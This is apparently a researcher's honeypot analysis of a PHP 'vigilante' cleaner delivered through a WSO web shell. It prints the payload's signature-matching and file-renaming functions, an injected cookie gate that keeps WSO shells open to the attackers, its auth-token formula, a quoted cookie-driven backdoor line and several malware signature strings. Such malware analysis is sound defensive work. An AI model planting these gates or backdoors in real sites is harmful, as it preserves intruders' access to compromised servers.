# Vigilante Malware Cleaner

*2018-05-22*

PHP downloaded to WSO web shell's "RC" action for immediate eval
that finds 56 different indications of PHP malware,
counts those indications,
returning the counts to the invoker.
It renames most files containing an indication of PHP malware.
Some files it leaves alone,
while it injects PHP into WSO web shells that only allows
requests with a compromised-host-specific cookie to access them.

I found an [older capture](198.71.239.32-2018-02-26a)
after I finished this analysis.
See that directory for analysis of any changes in the last 3 months.

It's possible that this code has been around and in use for a long time,
although the evidence is indirect.

Googling for the salt string used in the code injected into WSO instances,
"salt1I*@#31RTds34+543sf", nets me an undated instance of one of those
"PHP decoder" web pages ([ddecode.com](http://ddecode.com/phpdecoder))
containing a version of the [decision and cleanup functions](http://ddecode.com/phpdecoder/?results=260c433c8429c84b8bf9f5a607223c0b)
functions only.

* [2015-12-11 possible Joomla instance](https://forum.joomla.org/viewtopic.php?t=902352)
* [2016-07-08 possible cPanel instance](https://forums.cpanel.net/threads/suspected-file.555341/)
* [2015-12-15 possible Joomla instacne](https://stackoverflow.com/questions/31725357/php-file-changes-its-extension-to-suspeced)
* [2015-06-10 note](http://www.dbafire.com/2015/06/10/wp-includeslink-template-php-wordpress-problem-link-template-php-suspected/)

Looks like this Vigilante AV effort started June of 2015 or so.

The 2015-12-15 report has code that one of the matching functions would flag exactly.

2018-11-14: my WSO honey pot caught [another version](192.185.4.121-2018-11-14a).

2018-11-20: my WSO honey pot caught [another one](108.179.194.80-2018-11-21a)

2018-11-21: my WSO honey pot caught [another one](94.46.15.160-2018-11-22a)

2018-11-22: my WSO honey pot caught [another one](91.236.153.247-2018-11-23a)

2019-02-09: my WSO honey pot caught [another one](120.79.20.249-2019-03-04a)

There is ongoing development relating to which strings indicate compromised files.

## Origin

### IP Address 198.72.239.41

198.72.239.41 has DNS name a2nlwpweb040.prod.iad2.secureserver.net

It's owned by GoDaddy.

a2nlwpweb040.prod.iad2.secureserver.net has IP address 198.71.239.41 in DNS.

secureserver.net is owned by GoDaddy.

### Download

Looks like the attacker thought they were sending code to a WSO web shell.
They wanted to use WSO's "RC" action, which immediately eval's
any PHP code that arrives in the 'p1' HTTP POST parameter.

They thought that WSO was at `/wp-content/themes/sketch/404.php`.
That's a pretty common place for someone to hide WSO.
People download the "sketch" theme to my WordPress honey pot frequently.

## Analysis

The downloaded code consists of an unencoded portion,
a base64-encoded set of function definitions,
and a serialized, base64-encoded array-of-arrays.

### Unencoded portion

This looks a lot like boilerplate code for a program
dropper that's used to install a variety of PHP malware.
The [Code-in-cookie back door](backdoors/212.54.205.145-2018-01-25a)
has an almost exact copy of the `GetDocRoot()` function,
and the back door's `GetDirectoryList()` is clearly the
ancestor of this code's `GetFileList()` function.

Between functions `GetDocRoot()` and `GetFileList()`,
the code produces a list of files,
probably all files under Apache's DocumentRoot directory.
Circumstances exist where some subdirectory of Apache's
DocumentRoot or even "/"
(the root of the filesystem) might be used.

### Set of function definitions

The code creates 112 oddly-named functions
via the old favorite `eval(base64_decode())` function
composition.
Half (56) of the functions have an argument named `$path`,
the other half have an argument named `$content`.
The 56 functions with an argument named `$path` 
are identical except for the function name.
As an example:

    function gzfkylyosi($path)
    {
        if (!@rename($path, $path . ".suspected")) {
            @unlink($path);
        }
    }

Most these 56 functions either rename a file to have
".suspected" as a suffix,
or they delete the file.
A few files' contents get them special treatement.
See below.

The other 56 functions,
all having one formal argument named `$content`,
check for the presence of various strings.
These functions vary in complexity,
but a typical function looks like this:

    function rzbvtgkg($content)
    {
        if (strpos($content, "b374k 2.8") !== FALSE) {
            return TRUE;
        }
        return FALSE;
    }

It appears that each of the 56 `$content` functions
looks for a string or strings that appear in a particular PHP malware.
The above function clearly returns TRUE if it finds a
[b374k](webshells/b374k) web shell.

### Serialized array-of-arrays

Once base64-decoded and unserialized,
the array-of-arrays named `$defs` contains entries like this:

    {15, "rtob", "gfjsi"}

There are 56 of these entries.
Each string in the entry matches the name of a function.
For the entry above:

    function rtob($content)
    {
        if (strpos($content, "if(mail(\$MailTo,") !== FALSE) {
            if (substr_count($content, ")") == 14) {
                return TRUE;
            }
        }
        return FALSE;
    }
    function gfjsi($path)
    {
        if (!@rename($path, $path . ".suspected")) {
            @unlink($path);
        }
    }

One function to identify a file that might or probably
contains PHP malware code,
and one function to rename the file to "file.suspected".

Interestingly, the 0-element of the entries are not
numbered consecutively, running from 2 to 198.
Did more signatures appear in previous 
versions of this code in the past?

The three parts of this malware look
for "signatures" of other PHP malware,
then renames the files found.
It counts the number of each signature it finds,
and prints out a base64-encoded serialization of the array of counts of signatures.
That's clearly a machine-readable summary of what it found.

## Some malware that it will rename if found

* [b374k web shell](webshells/b374k), but only v2.8
* Anything FOPO-encoded
* [nptzow](../nptzow)
* Itself, but it's careful to not count itself twice
* JavaScript from "Ayildiz Tim" Turkish hackers' HTML
* Anything with the string '<?php @eval($_POST[', which should catch a lot of the 1-liner backdoors in WordPress themes or plugins
* Anything with the string `eval(gzinflate(base64_decode(`, which catches a lot of droppers
* Anything with a URL that [Spam Blocklist Recon malware](../36.65.41.151-2018-05-04a) often uses

## Special treatment of WSO web shells

Every incarnation of this malware has treated WSO web shells specially.
It calculates a random-looking string:

    $auth_token = md5(md5($_SERVER['HTTP_HOST']) . $_SERVER['HTTP_HOST'] . "salt1I*@#31RTds34+543sf");

It uses that random-looking string, which is specific to the compromised WordPress site's DNS name,
along with some PHP code at the beginning of the WSO file:

    if (!isset($_COOKIE['227e948fdbaaeccbbb7b3f42fbe848e8'])) {header('HTTP/1.0 404 Not Found');exit;}

WSO shells are now inaccessible if your browser doesn't send a DNS-name-specific cookie name.
WSO shells aren't neutralized like most other PHP malware.
The cookie name shown is from the DNS name of my WordPress honey pot.

I should note that the test for WSO-file-contents will return FALSE if the WSO file has already
received the cookie check above - the malware does not put in the cookie-name-check twice.

Every WSO (honey pot WSO) access made by these attackers has just such a cookie set.
That is, the HTTP POST requests arrive with an "auth_token" cookie with a value
as calculated above, and a WSO login cookie.
WSO login cookies have the name `md5($_SERVER['HTTP_HOST'])`,
and a value of the MD5 hash of some password.
It only makes sense to send along the vigilante cookie:
there's no penalty in WSO for having extra cookies,
and it's possible that the vigilantes have "cleaned up" some instance of WSO in the past.

## Other special treatments

The 2018-02-24 variant, in addition to extra protection on WSO shells,
has a couple of weird fix-ups.

Files containing a specific line of PHP:

    if (isset($_COOKIE["id"])) @$_COOKIE["user"]($_COOKIE["id"]);

have that line removed:

    function gmcbedtlo($path)
    {   
        @file_put_contents(
            $path,
            str_replace(
                "if (isset(\$_COOKIE[\"id\"])) @\$_COOKIE[\"user\"](\$_COOKIE[\"id\"]);",
                "",
                @file_get_contents($path)
            )
        );
    }

It looks like `function gmcbedtlo()` is getting rid of an obscure backdoor,
where a function name arrives in a cookie named "user",
and arguments arrive in a cookie named "id".
But why? Files containing other backdoors just get summarily renamed.

The 2018-02-24 version (at least) has an interesting g-function (cleanup function).

    function gxyomsosfm($path)
    {
        $content = @file_get_contents($path);
        $start = strpos($content, "<" . "?php");
        if ($start !== FALSE) {
            $stop = strpos($content, "?" . ">", $start);
            $payload_pos = strpos($content, "};eval(\$");
            if ($stop != FALSE && $payload_pos !== FALSE && $payload_pos < $stop) {
                $stop += 2;
                @file_put_contents($path, substr($content, $stop));
            }
        }
    }

It appears to cut off a trailing `eval($some_variable)`
from a larger body of PHP code, and write the code less the trailing eval
back to the file.
I have no PHP malware that matches the r-function,
so I can't definitively say what it does.

A good many r-functions (search functions) have g-functions (cleanup) that do nothing.
This is a bit puzzling.
It's possible that these "just ignore" g-functions exist so that
the vigilance committee can get counts of some specific malware,
to see if it's worth fixing/renaming later,
or to test new r-functions.

## ".suspected" URLs accessed

I have Apache `access_log` files in "combined" format dating back to 2009.
It looks like URIs with a ".suspected" suffix have shown up in the past,
the earliest from 2016

    2016-04-12 03:51:10-06 | 178.151.184.223 | /wp-content/plugins/wp-arm-config/antibot.php.suspected

Bizarrely, some URLs I found in my logs have a ".suspected_" suffix, perhaps another layer of moving the code around.

I don't understand accessing those URLs,
as Apache/2.4.33 seems to just send any such file's contents,
but without a "Content-type:" header.
Apache doesn't run the PHP interpreter on the URL's contents, so what's the point?

## Ongoing Development

As of 2018-11-24, my honey pot has received 6 downloads.
Because the search and cleanup function names consist
of random series of characters,
a little further analysis seems in order.

Each downloaded file has an array named `$defs`,
deserialized from a base64-encoded string.
Each element of array `$defs` consists of a triplet:
`[serial number, search function name, cleanup function name]`

There are 32 serial numbers common to all 4 different defs files.
The function names change (all begin with an 'r'),
but the bodies of the functions remain the same for all 32 common
serial numbers, across all downloads.

It seems like the vigilantes keep track of the search functions,
and potentially cleanup functions,
by a number, which I've called "serial number".

### Changing Search Functions

|Arrival Date|Count of functions|Count of Changed Functions|
|-----------|------------------|----|
|2018-02-27 | 88 |
|2018-05-19 | 56 | -34, +2
|2018-11-14 | 59 | -22, +25
|2018-11-20 | 60 | +1
|2018-11-22 | 60 | 0 |
|2018-11-23 | 60 | 0 |
|2019-02-09 | 67 | -8, +15|

The 2018-11-20, -22 and -23 downloads are identical except for randomized 
function names.

### Implications of ongoing development

It seems obvious that the vigilante development team
makes changes in the functions that this software uses
to detect malware.
They might base their changes on the serialized count
of functions found, ordered by serial number.
When a given serial number's function doesn't find other's
malware in a while,
they could remove that function.
It's a little harder to see a way for them to decide to
add a function, without some blind experimentation,
or somehow getting WordPress malware samples.
That's why I believe tht the "do nothing" g-functions exist.
They allow the vigilance committee to test new r-functions
in the wild, and to see what prevalence of malware actually exists.

Since the code preserves access to WSO shells,
you have to question the motives of the vigilance committee.
They clearly aren't behaving 100% altruistically.
